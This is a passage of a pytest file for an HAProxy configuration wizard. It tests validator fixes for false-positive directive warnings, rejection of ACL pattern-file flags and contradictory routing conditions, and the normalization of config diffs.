"""
Phase K Phase D follow-up (Bulgu #12 round 3) — heuristic validator
false-positive WARNING fixes + ACL `-f <file>` pattern-file flag block.

Operator-reported failure flow (Round 3, May 11):
    1. Wizard /preview emitted 8 WARNINGs:
         - frontend stick-table / tcp-request × 5
         - backend cookie × 2
         - "Missing 'global' section"
    2. Operator clicked Create anyway (WARNINGs do not block).
    3. Apply Management ran real `haproxy -c`, which FAILED with:
         [ALERT] parsing ACL 'acl1' : failed to open pattern file </path>.
         [ALERT] parsing switching rule : no such ACL : 'acl1'.
    4. The wizard's ACL builder had let the operator author
        `acl acl1 path -i -m reg -f /path` — the `-f` flag references
        a pattern file the product never provisions.

This file pins the post-fix contract on both fronts so a future
"simplification" cannot regress us back to either failure mode.
"""

import json

import pytest
from pathlib import Path
from pydantic import ValidationError

from utils.haproxy_validator import (
    HAProxyConfigValidator,
    ValidationLevel,
    validate_haproxy_config,
)

# Round-14 portability fix: the static-source pins below use Path()
# to load files like `models/site_wizard.py`. Pre-fix the paths were
# bare relative strings that ONLY resolved when pytest was invoked
# with cwd=backend/ — running the suite from the workspace root
# (or from a CI image with a different cwd) made every static-marker
# pin fail with FileNotFoundError. Anchor relative reads to the
# backend root (the parent of this test file's tests/ dir) so the
# pins work regardless of where pytest was launched from.
_BACKEND_DIR = Path(__file__).resolve().parent.parent


def _backend_src(rel: str) -> str:
    """Read a backend-relative source file as text, anchored at the
    backend/ dir so the read is independent of pytest's cwd."""
    return (_BACKEND_DIR / rel).read_text()


# ──────────────────────────────────────────────────────────────────────
# False-positive WARNING fixes (expanded valid_directives + partial-
# fragment detection).
# ──────────────────────────────────────────────────────────────────────


@pytest.mark.parametrize(
    "directive_line",
    [
        # All of these were FALSE POSITIVES pre-fix.
        "    stick-table type ip size 100k expire 30s store http_req_rate(10s)",
        "    tcp-request inspect-delay 5s",
        "    tcp-request content accept if { req_ssl_hello_type 1 }",
        "    tcp-response content reject if { sc_http_req_rate(0) gt 100 }",
        "    http-after-response set-header X-Cache miss",
        "    errorfile 503 /etc/haproxy/errors/503.http",
        "    description test frontend",
        "    capture request header User-Agent len 64",
    ],
)
def test_frontend_section_no_longer_flags_valid_directives(directive_line):
    """The wizard emits stick-table / tcp-request on frontends with
    rate-limit WAF rules. Pre-fix every emission flagged a WARNING.
    """
    config = f"frontend test\n    bind *:80\n    mode http\n{directive_line}\n    default_backend be1\n"
    report = HAProxyConfigValidator().validate_config(config)
    invalid_warns = [
        r for r in report.results
        if r.level == ValidationLevel.WARNING
        and r.message.startswith("Directive '")
        and "may not be valid in 'frontend' section" in r.message
    ]
    assert invalid_warns == [], (
        f"Bulgu #12 regression: frontend directive flagged as invalid: "
        f"{[w.message for w in invalid_warns]}"
    )


@pytest.mark.parametrize(
    "directive_line",
    [
        "    cookie SERVERID insert indirect nocache",
        "    tcp-request content accept if WAIT_END",
        "    http-after-response set-header X-Backend be1",
        "    retries 3",
        "    redirect prefix /api code 301 if needs_api",
        "    description backend description",
        "    errorfile 502 /etc/haproxy/errors/502.http",
    ],
)
def test_backend_section_no_longer_flags_valid_directives(directive_line):
    """`cookie` is THE canonical session-stickiness directive on
    backend; the heuristic was flagging it as invalid pre-fix.
    """
    config = f"backend test\n    mode http\n    server srv1 1.1.1.1:80 check\n{directive_line}\n"
    report = HAProxyConfigValidator().validate_config(config)
    invalid_warns = [
        r for r in report.results
        if r.level == ValidationLevel.WARNING
        and r.message.startswith("Directive '")
        and "may not be valid in 'backend' section" in r.message
    ]
    assert invalid_warns == [], (
        f"Bulgu #12 regression: backend directive flagged as invalid: "
        f"{[w.message for w in invalid_warns]}"
    )


def test_partial_fragment_skips_missing_global_warning():
    """The wizard's candidate config OMITS global/defaults because the
    agent merges them with its local copy on disk. The validator must
    suppress the "Missing 'global' section" WARNING when
    partial_fragment=True.
    """
    config = (
        "frontend fe1\n"
        "    bind *:80\n"
        "    mode http\n"
        "    default_backend be1\n"
        "\n"
        "backend be1\n"
        "    mode http\n"
        "    server srv1 1.1.1.1:80 check\n"
    )
    # Without flag — fires
    report_full = HAProxyConfigValidator().validate_config(config)
    missing_global = [
        r for r in report_full.results
        if r.level == ValidationLevel.WARNING
        and "Missing 'global'" in r.message
    ]
    assert missing_global, (
        "Complete-config callers should still see the missing-global "
        "warning (sanity check for the inverse case)."
    )
    # With flag — suppressed
    report_partial = HAProxyConfigValidator().validate_config(
        config, partial_fragment=True
    )
    missing_global_partial = [
        r for r in report_partial.results
        if r.level == ValidationLevel.WARNING
        and "Missing 'global'" in r.message
    ]
    assert missing_global_partial == [], (
        f"Bulgu #12 regression: partial_fragment=True must suppress "
        f"missing-global WARNING. Got: {[w.message for w in missing_global_partial]}"
    )


def test_partial_fragment_auto_detected_via_marker_comment():
    """The wizard's `_build_candidate_fragment` emits a marker
    comment. The validator auto-detects partial-fragment mode from
    the marker so callers that forget to pass the flag still see
    suppressed warnings.
    """
    config = (
        "# ─── Wizard candidate fragment (dry-run preview) ───\n"
        "frontend fe1\n"
        "    bind *:80\n"
        "    mode http\n"
        "    default_backend be1\n"
        "\n"
        "backend be1\n"
        "    mode http\n"
        "    server srv1 1.1.1.1:80 check\n"
    )
    # No explicit flag — auto-detect should kick in.
    report = HAProxyConfigValidator().validate_config(config)
    missing_global = [
        r for r in report.results
        if r.level == ValidationLevel.WARNING
        and "Missing 'global'" in r.message
    ]
    assert missing_global == [], (
        f"Bulgu #12 regression: marker-comment auto-detect must "
        f"suppress missing-global. Got: {[w.message for w in missing_global]}"
    )


def test_module_level_validate_haproxy_config_forwards_partial_fragment():
    """`validate_haproxy_config(content, partial_fragment=True)` — the
    module-level convenience wrapper must forward the flag.
    """
    config = "frontend fe1\n    bind *:80\n    mode http\n"
    report_full = validate_haproxy_config(config)
    assert any(
        r.level == ValidationLevel.WARNING and "Missing 'global'" in r.message
        for r in report_full.results
    ), "Sanity: missing-global fires on complete-config defaults"
    report_partial = validate_haproxy_config(config, partial_fragment=True)
    assert not any(
        r.level == ValidationLevel.WARNING and "Missing 'global'" in r.message
        for r in report_partial.results
    ), "Module-level wrapper failed to forward partial_fragment=True"


# ──────────────────────────────────────────────────────────────────────
# Wizard Pydantic gate: ACL `-f` flag must be REJECTED at submit.
# ──────────────────────────────────────────────────────────────────────


def test_wizard_pydantic_rejects_acl_with_file_flag():
    """Pre-fix the wizard's ACL string validator passed
    `acl name path -i -m reg -f /path` straight through. Apply-time
    HAProxy `-c` then failed with "failed to open pattern file".
    Pin that the validator now rejects `-f` at submit.
    """
    from models.site_wizard import FrontendStep

    # Minimal valid wizard frontend kwargs — only the offending
    # acl_rules entry should trigger the failure.
    fe_kwargs = dict(
        name="fe1",
        mode="http",
        bind_address="*",
        bind_port=80,
        acl_rules=["acl1 path -i -m reg -f /path"],
    )
    from pydantic import ValidationError
    with pytest.raises(ValidationError) as exc_info:
        FrontendStep(**fe_kwargs)
    msg = str(exc_info.value)
    assert "-f" in msg or "pattern-file" in msg.lower(), (
        f"Bulgu #12 regression: ACL -f flag must be rejected with a "
        f"clear pattern-file error. Got: {msg}"
    )


@pytest.mark.parametrize(
    "rule",
    [
        # Various spacing / position variants the regex must catch.
        "acl1 path -f /etc/haproxy/list",
        "acl1 path -i -f /tmp/x.lst",
        "acl1 src -f /etc/haproxy/admins.lst",
        "acl1 hdr(Host) -i -f /var/log/hosts.lst",
        # `-f` at the very end with no trailing space:
        "acl1 path -f",
    ],
)
def test_wizard_pydantic_rejects_acl_with_file_flag_variants(rule):
    """Every spacing / position variant the operator might type must
    be rejected. Pinned defensively so the regex never accidentally
    relaxes to "only matches trailing -f".
    """
    from models.site_wizard import FrontendStep
    from pydantic import ValidationError

    fe_kwargs = dict(
        name="fe1",
        mode="http",
        bind_address="*",
        bind_port=80,
        acl_rules=[rule],
    )
    with pytest.raises(ValidationError):
        FrontendStep(**fe_kwargs)


def test_wizard_pydantic_does_not_falsely_match_dash_f_inside_token():
    """The regex MUST NOT match `-foo`, `--foo`, `something-flag`,
    etc. Only the bare `-f` token with whitespace boundaries.
    """
    from models.site_wizard import FrontendStep

    fe_kwargs = dict(
        name="fe1",
        mode="http",
        bind_address="*",
        bind_port=80,
        # Each of these has `-f` as a SUBSTRING but not as a token.
        acl_rules=[
            "is_foo path_beg /foo",                  # `-foo` in path: no match
            "is_dashed src 10.0.0.0/24",             # plain rule
            "is_self path_beg /self-config-file",    # `-file` substring: no match
        ],
    )
    # Should NOT raise.
    fe = FrontendStep(**fe_kwargs)
    assert len(fe.acl_rules) == 3


def test_manual_frontend_validator_rejects_acl_with_file_flag():
    """Parity check: the manual Frontend API
    (`models/frontend.py::validate_acl_rules`) must apply the same
    `-f` rejection. Operators see consistent behaviour from both the
    wizard and the per-entity frontend page.
    """
    from models.frontend import FrontendConfig
    from pydantic import ValidationError

    with pytest.raises(ValidationError) as exc_info:
        FrontendConfig(
            name="fe1",
            bind_port=80,
            mode="http",
            acl_rules=["acl1 path -i -m reg -f /path"],
        )
    msg = str(exc_info.value)
    assert "-f" in msg or "pattern-file" in msg.lower(), (
        f"Manual frontend API parity regression: ACL -f flag must be "
        f"rejected. Got: {msg}"
    )


def test_wizard_pydantic_rejects_structured_redirect_dict_with_file_flag():
    """Round-3 audit extension — structured redirect dicts (the
    alternative shape that `models/site_wizard.py::_validate_redirect_rules`
    accepts alongside legacy strings) also flow through to
    `services/haproxy_config.py::_format_redirect_rule` and emit
    their `condition` / `target` verbatim into the rendered HAProxy
    directive. Without the dict-aware reject the visual builder's
    `-f` block could be bypassed by hand-crafting a dict payload
    against the API — recreating the same `failed to open pattern
    file` failure at apply time.
    """
    from models.site_wizard import FrontendStep, BackendStep
    from pydantic import ValidationError

    fe_kwargs = dict(
        name="fe1",
        port=80,
        mode="http",
    )

    # `condition` carrying `-f` must be rejected.
    with pytest.raises(ValidationError) as exc_info:
        FrontendStep(
            **fe_kwargs,
            redirect_rules=[
                {
                    "type": "scheme",
                    "target": "https",
                    "condition": "if { src -f /etc/haproxy/admins.lst }",
                }
            ],
        )
    msg = str(exc_info.value)
    assert "pattern-file" in msg.lower() or "-f" in msg, msg

    # `target` carrying `-f` must also be rejected (defence-in-depth
    # for hand-crafted payloads).
    with pytest.raises(ValidationError) as exc_info:
        FrontendStep(
            **fe_kwargs,
            redirect_rules=[
                {
                    "type": "location",
                    "target": "/foo -f /tmp/x.lst",
                }
            ],
        )
    msg = str(exc_info.value)
    assert "pattern-file" in msg.lower() or "-f" in msg, msg

    # Clean structured dict still passes — no false positive.
    FrontendStep(
        **fe_kwargs,
        redirect_rules=[
            {
                "type": "scheme",
                "target": "https",
                "condition": "if !{ ssl_fc }",
            }
        ],
    )


# ──────────────────────────────────────────────────────────────────────
# Bulgu #13 — `X !X` contradiction detection (use_backend / redirect).
# ──────────────────────────────────────────────────────────────────────


@pytest.mark.parametrize(
    "rule",
    [
        "be-site if acl1 !acl1",
        "be-site if acl1   !acl1",
        "be-site unless acl1 !acl1",
        "be-site if !acl1 acl1",
        "be-site if acl1 acl2 !acl1",  # contradiction in subset
    ],
)
def test_wizard_pydantic_rejects_use_backend_with_acl_contradiction(rule):
    """Operator-reported Bulgu #13 — the wizard's mode="tags"
    Select for routing conditions previously allowed both
    `acl1` AND `!acl1` to be selected for the same rule. The
    Pydantic guard rejects the resulting `X AND NOT X` payload
    before persist.
    """
    from models.site_wizard import FrontendStep
    from pydantic import ValidationError

    with pytest.raises(ValidationError) as exc_info:
        FrontendStep(
            name="fe1",
            port=80,
            mode="http",
            use_backend_rules=[rule],
        )
    msg = str(exc_info.value)
    assert (
        "contradictory" in msg.lower()
        or "x and not x" in msg.lower()
        or "always false" in msg.lower()
    ), msg


def test_wizard_pydantic_rejects_redirect_rule_with_acl_contradiction():
    """Same contradiction check applies to redirect rules (both
    string AND dict shape)."""
    from models.site_wizard import FrontendStep
    from pydantic import ValidationError

    with pytest.raises(ValidationError) as exc:
        FrontendStep(
            name="fe1",
            port=80,
            mode="http",
            redirect_rules=["scheme https if acl1 !acl1"],
        )
    assert (
        "contradictory" in str(exc.value).lower()
        or "always false" in str(exc.value).lower()
    )

    with pytest.raises(ValidationError) as exc2:
        FrontendStep(
            name="fe1",
            port=80,
            mode="http",
            redirect_rules=[
                {
                    "type": "scheme",
                    "target": "https",
                    "condition": "if acl1 !acl1",
                }
            ],
        )
    assert (
        "contradictory" in str(exc2.value).lower()
        or "always false" in str(exc2.value).lower()
    )


def test_wizard_pydantic_accepts_consistent_conditions_no_false_positives():
    """Routing rules with consistent conditions must NOT trigger
    the contradiction guard."""
    from models.site_wizard import FrontendStep

    # All of these have logically consistent conditions.
    fe = FrontendStep(
        name="fe1",
        port=80,
        mode="http",
        use_backend_rules=[
            "be-api if is_api",
            "be-static unless is_dynamic",
            "be-admin if is_admin is_authenticated",
            "be-public if !is_admin",  # `!X` alone is fine
            "be-fallback if !is_api !is_static",  # two negatives, no contradiction
            "be-special if acl1 acl2 !acl3",  # mixed but no `X !X`
        ],
    )
    assert len(fe.use_backend_rules) == 6


def test_manual_frontend_validator_rejects_use_backend_with_acl_contradiction():
    """Bulgu #62 (round-22 audit) — the contradiction check moved
    from the FrontendConfig model into the route handler so the
    UPDATE path can grandfather legacy rules. The model now ACCEPTS
    the rule (preserves backward compat for direct model
    constructions and test stubs); the route handler enforces the
    reject at POST and grandfathers it at PUT. This test now pins
    the handler-level helper instead of the model-level reject."""
    from models.frontend import FrontendConfig
    from routers.frontend import _collect_routing_rule_contradictions

    fe = FrontendConfig(
        name="fe1",
        bind_port=80,
        mode="http",
        use_backend_rules=["be-x if acl1 !acl1"],
    )
    assert fe.use_backend_rules == ["be-x if acl1 !acl1"]

    conflicts = _collect_routing_rule_contradictions(
        fe.use_backend_rules, "use_backend_rules",
    )
    assert len(conflicts) == 1
    assert conflicts[0][0] == "use_backend_rules"


def test_manual_frontend_validator_rejects_redirect_with_acl_contradiction():
    """Bulgu #62 (round-22 audit) — same as the use_backend test:
    the model now accepts the rule and the handler-level helper
    flags it. Pins that the helper still catches the same shape."""
    from models.frontend import FrontendConfig
    from routers.frontend import _collect_routing_rule_contradictions

    fe = FrontendConfig(
        name="fe1",
        bind_port=80,
        mode="http",
        redirect_rules=["scheme https if acl1 !acl1"],
    )
    assert fe.redirect_rules == ["scheme https if acl1 !acl1"]

    conflicts = _collect_routing_rule_contradictions(
        fe.redirect_rules, "redirect_rules",
    )
    assert len(conflicts) == 1
    assert conflicts[0][0] == "redirect_rules"


# ──────────────────────────────────────────────────────────────────────
# Bulgu #13 — `http-request track-sc0 src` dedup in renderer.
# ──────────────────────────────────────────────────────────────────────


def test_renderer_dedups_track_sc0_within_frontend():
    """Pre-fix every WAF rate_limit rule emitted its own
    `http-request track-sc0 src` line. HAProxy only NEEDS one
    track call per frontend; the subsequent rate-limit rules
    consume the same counter via `sc_http_req_rate(0)`. The
    renderer now dedupes after the first occurrence.

    Static-source pin so a future refactor cannot drop the dedup.
    """
    from pathlib import Path
    src = (
        Path(__file__).resolve().parent.parent
        / "services"
        / "haproxy_config.py"
    )
    body = src.read_text()
    # Round-2 refinement (track-sc<N> signature dedup): accept
    # either layout so the test doesn't false-fail across the
    # legacy single-flag and the new (counter, fetch) set forms.
    assert (
        "_track_sc_signatures" in body
        or "_track_sc0_emitted" in body
    ), (
        "Bulgu #13 renderer regression: the track-sc dedup state "
        "is missing. Every WAF rate-limit rule will emit a "
        "redundant `http-request track-sc<N> <fetch>` line into "
        "the frontend block."
    )
    assert ("TRACK-SC DEDUP" in body) or ("TRACK-SC0 DEDUP" in body), (
        "Bulgu #13 renderer regression: the dedup log line is "
        "no longer emitted, which means operators cannot audit "
        "the dedup decisions."
    )


def test_sitewizard_orphan_clear_degrades_ssl_mode_to_none():
    """Bulgu #14 — when the orphan-cert cleanup nullifies
    `ssl.ssl_certificate_id` while the form had
    `ssl.mode='existing'`, the resulting state is logically
    inconsistent (Pydantic rejects "mode=existing requires
    ssl_certificate_id"). The wizard must auto-degrade the mode
    to 'none' so the form stays self-consistent AND bounce the
    operator back to Step 3 (SSL & ACME) so they can pick a
    replacement.

    Static-source pin protects this remediation against a
    future refactor that re-introduces the inconsistent state.
    """
    from pathlib import Path
    src = (
        Path(__file__).resolve().parent.parent.parent
        / "frontend"
        / "src"
        / "components"
        / "SiteWizard.js"
    )
    if not src.exists():
        pytest.skip(
            f"frontend not present at {src}; running in backend-only "
            "container is expected — skip JS source pin"
        )
    body = src.read_text()
    # Mode auto-degrade.
    assert (
        "mode: 'none'" in body
        and "ssl_certificate_id === undefined" in body
        and "cur?.ssl?.mode === 'existing'" in body
    ), (
        "Bulgu #14 regression: orphan-cert cleanup no longer "
        "auto-degrades `ssl.mode` to 'none' when it nulls "
        "ssl_certificate_id. The dry-run on Step 5 will reject "
        "the inconsistent state with a confusing Pydantic error."
    )
    # Auto-navigation back to Step 3.
    assert "SSL_STEP_INDEX" in body, (
        "Bulgu #14 regression: the SSL step index constant has "
        "been removed; the orphan-clear rescue navigation uses "
        "this name to avoid a magic number."
    )
    assert "setTimeout(() => setStep(SSL_STEP_INDEX)" in body, (
        "Bulgu #14 regression: the orphan-clear rescue no longer "
        "bounces the operator back to the SSL step after the "
        "form fields were nulled. They will stay parked at the "
        "Review step staring at a Pydantic error message that "
        "doesn't tell them where to fix the inconsistency."
    )
    # Persistent in-page banner.
    assert "orphanClearedCerts" in body, (
        "Bulgu #14 regression: the persistent in-page Alert that "
        "explains the orphan-clear is gone. Operators on a busy "
        "screen miss the ephemeral message.warning toast."
    )


def test_renderer_skips_per_server_cookie_when_backend_has_no_cookie_directive():
    """Pre-fix the renderer emitted `server srv1 ... cookie srv1`
    even when the parent backend had no `cookie SERVERID insert
    ...` directive. Without backend-level cookie persistence the
    per-server cookie is just metadata — HAProxy stores it but
    never inserts/reads. This produced silently broken
    stickiness for operators who set the per-server cookie value
    without enabling backend cookies.

    Static-source pin: the renderer now only emits the per-server
    cookie when `backend.cookie_name` is set.
    """
    from pathlib import Path
    src = (
        Path(__file__).resolve().parent.parent
        / "services"
        / "haproxy_config.py"
    )
    body = src.read_text()
    assert "parent_backend_has_cookie" in body, (
        "Bulgu #13 renderer regression: the per-server cookie "
        "emit branch is back to unconditional. Re-introduce the "
        "`parent_backend_has_cookie` guard."
    )
    assert "CONFIG COOKIE INCONSISTENT" in body, (
        "Bulgu #13 renderer regression: the diagnostic log that "
        "tells operators why their per-server cookie was skipped "
        "is missing."
    )


# ──────────────────────────────────────────────────────────────────────
# End-to-end pin: the user-reported wizard config now passes dry-run
# WITHOUT spurious WARNINGs but the ACL with -f is rejected upstream
# at Pydantic so the validator never even sees it.
# ──────────────────────────────────────────────────────────────────────


def test_user_reported_wizard_config_emits_no_false_warnings():
    """Replay the user's actual wizard config (from the Round 3
    rejection) WITHOUT the offending `-f` ACL. Validator must report
    zero WARNINGs from the directives we expanded.
    """
    # Distilled from the user's bulk-site-create snapshot, minus the
    # `-f` ACL (which the new Pydantic gate rejects before this
    # validator ever runs).
    config = """# ─── Wizard candidate fragment (dry-run preview) ───
frontend fe-site1
    bind *:80
    mode http
    timeout client 1234ms
    timeout http-request 4444ms
    maxconn 1001
    compression algo gzip
    monitor-uri /hel
    log 127.0.0.1:514 local0 info
    stick-table type ip size 100k expire 30s store http_req_rate(10s)
    acl is_acme_challenge path_beg /.well-known/acme-challenge/
    http-request allow if is_acme_challenge
    http-request track-sc0 src
    http-request deny if { sc_http_req_rate(0) gt 123 }
    use_backend _acme_challenge_backend if is_acme_challenge
    default_backend be-site1

backend be-site1
    balance roundrobin
    mode http
    option httpchk GET /hh1
    http-check expect status 201
    timeout connect 10000ms
    timeout server 60000ms
    timeout queue 60000ms
    cookie SERVERID insert indirect nocache
    server srv1 1.1.1.1:8081 weight 101 check
"""
    report = HAProxyConfigValidator().validate_config(config)
    # Filter to the directive-invalidity WARNINGs we explicitly fixed.
    bad_warns = [
        r for r in report.results
        if r.level == ValidationLevel.WARNING
        and r.message.startswith("Directive '")
        and (
            "stick-table" in r.message
            or "tcp-request" in r.message
            or "cookie" in r.message
        )
    ]
    assert bad_warns == [], (
        f"Bulgu #12 end-to-end regression: user-reported wizard "
        f"config still emits spurious directive-invalidity WARNINGs: "
        f"{[w.message for w in bad_warns]}"
    )
    # And missing-global must be suppressed (auto-detected via marker).
    missing_global = [
        r for r in report.results
        if r.level == ValidationLevel.WARNING
        and "Missing 'global'" in r.message
    ]
    assert missing_global == [], (
        "Bulgu #12 end-to-end regression: marker-comment auto-detect "
        "failed to suppress missing-global WARNING."
    )


# ──────────────────────────────────────────────────────────────────────
# Round 4 hardening (post-Bulgu #14 follow-up)
#
# Three pin tests for the audit-round additions that don't have any
# other coverage in the test corpus:
#
#   1. track-sc<N> dedup is signature-scoped — `track-sc0 src` and
#      `track-sc0 dst` (different sample fetches → different counter
#      keys per HAProxy) must BOTH stay; only IDENTICAL tracker
#      signatures collapse.
#
#   2. SiteWizard orphan-detect treats usage_type mismatch as orphan
#      (Bulgu #2 parity follow-up). The HTTPS frontend cert slot
#      requires `usage_type='frontend'`; the per-server CA bundle
#      slot requires `usage_type='server'`. A cert that an admin
#      re-tagged from 'frontend' → 'server' on the SSL Management
#      page would pass the legacy "id is in the list" check but
#      then disappear from the dropdown filter. Auto-clear so the
#      form is self-consistent.
#
#   3. SiteDrafts label for the HTTPS frontend creation timing field
#      moved from the technical "Deferred: Yes/No" to the operator-
#      facing "Created at: After ACME cert issuance / Immediately
#      at apply". Pin the new label so a future translation /
#      rewrite doesn't silently revert it to the cryptic
#      "Deferred".
# ──────────────────────────────────────────────────────────────────────


def test_track_sc_dedup_is_signature_scoped():
    """Round-4 refinement: dedup the FULL `track-sc<N> <fetch>` line,
    not just `track-sc0`. So `track-sc0 src` and `track-sc0 dst`
    coexist (different counter keys); two identical `track-sc0 src`
    lines collapse to one.
    """
    from pathlib import Path
    src = (
        Path(__file__).resolve().parents[1]
        / "services"
        / "haproxy_config.py"
    )
    body = src.read_text()
    assert "_track_sc_signatures" in body, (
        "Round-4 regression: dedup state must be a SET of "
        "(counter, fetch) signatures, not a single boolean flag. "
        "Otherwise legitimate `track-sc0 src` + `track-sc0 dst` "
        "combinations are incorrectly collapsed."
    )
    assert 'startswith("http-request track-sc")' in body, (
        "Round-4 regression: dedup must scope to the track-sc<N> "
        "family (any counter index), not just track-sc0."
    )


def test_orphan_detect_uses_usage_type_compatibility():
    """Round-4 audit: orphan detection must use a usage_type-aware
    compatibility check, not a bare `certIds.has(id)` membership.
    Otherwise a cert that an admin re-tagged from 'frontend' →
    'server' (or vice-versa) on the SSL Management page would
    silently survive in the wizard form while disappearing from
    the filtered dropdown.
    """
    from pathlib import Path
    src = (
        Path(__file__).resolve().parents[1].parent
        / "frontend"
        / "src"
        / "components"
        / "SiteWizard.js"
    )
    if not src.exists():
        pytest.skip(
            "frontend source tree not present in this build context "
            "(backend-only image)."
        )
    body = src.read_text()
    assert "isCompatible(certId, expectedUsage)" in body or (
        "isCompatible = (certId, expectedUsage)" in body
    ), (
        "Round-4 regression: the orphan-detect effect must define a "
        "`isCompatible(certId, expectedUsage)` helper that checks BOTH "
        "the id presence AND the usage_type compatibility."
    )
    assert "expected 'frontend'" in body, (
        "Round-4 regression: the orphan toast must explicitly call "
        "out the expected usage_type so the operator understands "
        "WHY the cert was cleared (not just 'cert was deleted')."
    )
    assert "expected 'server'" in body, (
        "Round-4 regression: per-server ca-file orphan toast must "
        "call out the expected 'server' usage_type."
    )


def test_sitedrafts_https_creation_timing_label_is_operator_facing():
    """Round-4 audit: the HTTPS frontend creation-timing field in the
    Site Drafts preview must use the operator-facing
    "Created at: After ACME cert issuance / Immediately at apply"
    instead of the cryptic legacy "Deferred: Yes / No".
    """
    from pathlib import Path
    src = (
        Path(__file__).resolve().parents[1].parent
        / "frontend"
        / "src"
        / "components"
        / "SiteDrafts.js"
    )
    if not src.exists():
        pytest.skip(
            "frontend source tree not present in this build context "
            "(backend-only image)."
        )
    body = src.read_text()
    assert "After ACME cert issuance" in body, (
        "Round-4 regression: the deferred HTTPS frontend timing label "
        "lost its operator-facing wording. Restore the "
        "'After ACME cert issuance' branch."
    )
    assert "Immediately at apply" in body, (
        "Round-4 regression: the non-deferred branch lost its "
        "operator-facing wording. Restore the "
        "'Immediately at apply' branch."
    )


# ──────────────────────────────────────────────────────────────────────
# Bulgu #15 — Diff endpoint normalization
#
# Operator-reported case: wizard NEXT-NEXT-CREATE with only a new
# frontend port + a new backend server IP produced an Apply Management
# diff that showed `-` lines on UNTOUCHED existing entities (extra
# `http-request track-sc0 src` lines and `cookie srv1` per-server
# attributes).
#
# Root cause: the previous-version `config_content` was rendered with
# the OLD renderer (pre-Bulgu #13 dedup/strip), and the new version
# with the NEW renderer. The textual diff legitimately surfaced the
# renderer evolution as `+`/`-` lines on entities the operator never
# touched, breaking the "I added one site; the diff should be `+`-
# only" mental model.
#
# Fix: normalize BOTH sides of the diff through
# `_normalize_haproxy_config_text_for_diff` before computing the
# unified diff. The function applies the same `track-sc<N>` dedup
# and `cookie <name>` strip that the renderer now performs, so
# renderer-only differences cancel out and the diff surfaces only
# operator-intent changes.
# ──────────────────────────────────────────────────────────────────────


def test_normalize_dedups_duplicate_track_sc_within_frontend():
    """Duplicate `http-request track-sc0 src` lines in a frontend
    block must collapse to a single occurrence.
    """
    from services.haproxy_config import (
        _normalize_haproxy_config_text_for_diff,
    )
    text = (
        "frontend fe-test\n"
        "    bind *:80\n"
        "    mode http\n"
        "    http-request track-sc0 src\n"
        "    http-request deny if { sc_http_req_rate(0) gt 100 }\n"
        "    http-request track-sc0 src\n"
        "    http-request deny if { sc_http_req_rate(0) gt 200 }\n"
        "    http-request track-sc0 src\n"
        "    default_backend be-test\n"
    )
    normalized = _normalize_haproxy_config_text_for_diff(text)
    track_lines = [
        ln for ln in normalized.split('\n')
        if ln.strip().startswith('http-request track-sc0 src')
    ]
    assert len(track_lines) == 1, (
        f"Bulgu #15 regression: duplicate `http-request track-sc0 src` "
        f"lines must collapse to a single occurrence per frontend; "
        f"got {len(track_lines)} lines in: {normalized!r}"
    )
    # The deny lines (which are NOT duplicate signatures) must
    # survive unchanged.
    deny_lines = [
        ln for ln in normalized.split('\n')
        if ln.strip().startswith('http-request deny')
    ]
    assert len(deny_lines) == 2, (
        f"Bulgu #15 regression: distinct `http-request deny` rules "
        f"were incorrectly collapsed; got {len(deny_lines)} lines."
    )


def test_normalize_preserves_different_track_sc_signatures():
    """Different (counter, fetch) signatures (`track-sc0 src` vs
    `track-sc0 dst` vs `track-sc1 src`) must NOT collapse — each
    populates a distinct HAProxy state-table slot.
    """
    from services.haproxy_config import (
        _normalize_haproxy_config_text_for_diff,
    )
    text = (
        "frontend fe-test\n"
        "    bind *:80\n"
        "    http-request track-sc0 src\n"
        "    http-request track-sc0 dst\n"
        "    http-request track-sc1 src\n"
        "    default_backend be-test\n"
    )
    normalized = _normalize_haproxy_config_text_for_diff(text)
    track_lines = [
        ln.strip() for ln in normalized.split('\n')
        if ln.strip().startswith('http-request track-sc')
    ]
    assert track_lines == [
        'http-request track-sc0 src',
        'http-request track-sc0 dst',
        'http-request track-sc1 src',
    ], (
        f"Bulgu #15 regression: distinct (counter, fetch) signatures "
        f"were incorrectly collapsed. Got: {track_lines}"
    )


def test_normalize_resets_track_sigs_per_section():
    """Two SEPARATE frontends each get their own `track-sc0 src` line.
    Section boundary must reset the dedup state.
    """
    from services.haproxy_config import (
        _normalize_haproxy_config_text_for_diff,
    )
    text = (
        "frontend fe-one\n"
        "    bind *:80\n"
        "    http-request track-sc0 src\n"
        "    default_backend be-one\n"
        "\n"
        "frontend fe-two\n"
        "    bind *:81\n"
        "    http-request track-sc0 src\n"
        "    default_backend be-two\n"
    )
    normalized = _normalize_haproxy_config_text_for_diff(text)
    track_count = sum(
        1 for ln in normalized.split('\n')
        if ln.strip() == 'http-request track-sc0 src'
    )
    assert track_count == 2, (
        f"Bulgu #15 regression: per-section dedup state did not reset "
        f"between two frontends — got {track_count} track-sc0 lines."
    )


def test_normalize_strips_per_server_cookie_when_backend_lacks_cookie_directive():
    """If a backend block has NO top-level `cookie ...` directive, any
    per-server `cookie <name>` attribute is silently broken (stickiness
    won't work). The renderer strips it; the normalizer must strip it
    on the diff side too.
    """
    from services.haproxy_config import (
        _normalize_haproxy_config_text_for_diff,
    )
    text = (
        "backend be-no-cookie\n"
        "    balance roundrobin\n"
        "    mode http\n"
        "    server srv1 1.1.1.1:8080 weight 100 check cookie srv1 backup\n"
        "    server srv2 2.2.2.2:8080 weight 100 check\n"
    )
    normalized = _normalize_haproxy_config_text_for_diff(text)
    srv1 = [
        ln for ln in normalized.split('\n')
        if 'srv1' in ln and ln.strip().startswith('server ')
    ]
    assert srv1, "test setup error: srv1 line missing"
    assert ' cookie ' not in srv1[0], (
        f"Bulgu #15 regression: per-server `cookie <name>` must be "
        f"stripped when the parent backend has no `cookie` "
        f"directive. Got: {srv1[0]!r}"
    )
    # The rest of the directive (`backup`) must survive.
    assert 'backup' in srv1[0], (
        f"Bulgu #15 regression: stripping cookie pair clobbered "
        f"other server attributes. Got: {srv1[0]!r}"
    )


def test_normalize_preserves_per_server_cookie_when_backend_has_cookie_directive():
    """The strip is conditional on the parent backend lacking a `cookie`
    directive. If the backend DOES declare `cookie SERVERID insert ...`,
    the per-server cookie attribute is legitimate and must stay.
    """
    from services.haproxy_config import (
        _normalize_haproxy_config_text_for_diff,
    )
    text = (
        "backend be-with-cookie\n"
        "    balance roundrobin\n"
        "    mode http\n"
        "    cookie SERVERID insert indirect nocache\n"
        "    server srv1 1.1.1.1:8080 weight 100 check cookie srv1\n"
        "    server srv2 2.2.2.2:8080 weight 100 check cookie srv2\n"
    )
